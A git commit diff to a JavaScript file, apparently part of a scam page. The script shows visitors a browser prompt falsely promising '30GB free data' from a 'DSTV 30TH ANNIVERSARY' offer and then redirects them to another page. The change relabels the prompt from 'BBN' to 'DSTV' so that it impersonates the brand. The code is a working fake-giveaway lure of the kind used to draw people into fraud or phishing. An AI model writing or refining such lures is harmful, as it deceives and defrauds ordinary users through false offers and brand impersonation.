52f618f0f7ce6843214ce9146446c3657d1d43c0
itidnewblog3 <ukpehaitid1@gmail.com>
2025-10-11 16:54:09 +0100

    Update imisi-active.js

--- imisi-active.js
+++ imisi-active.js
@@ -1,5 +1,5 @@
 var password = 'ACTIVATE 30GB'
-password=prompt('BBN: Congratulations, your mobile number is eligible to receive 30GB free data from (DSTV 30TH ANNIVERSARY) , click OK to get offer now','ACTIVATE 30GB');
+password=prompt('DSTV: Congratulations, your mobile number is eligible to receive 30GB free data from (DSTV 30TH ANNIVERSARY) , click OK to get offer now','ACTIVATE 30GB');
 if (password != 'ACTIVATE 30GB') {
 location.href='https://lhegit.org/imisi.html';
 }
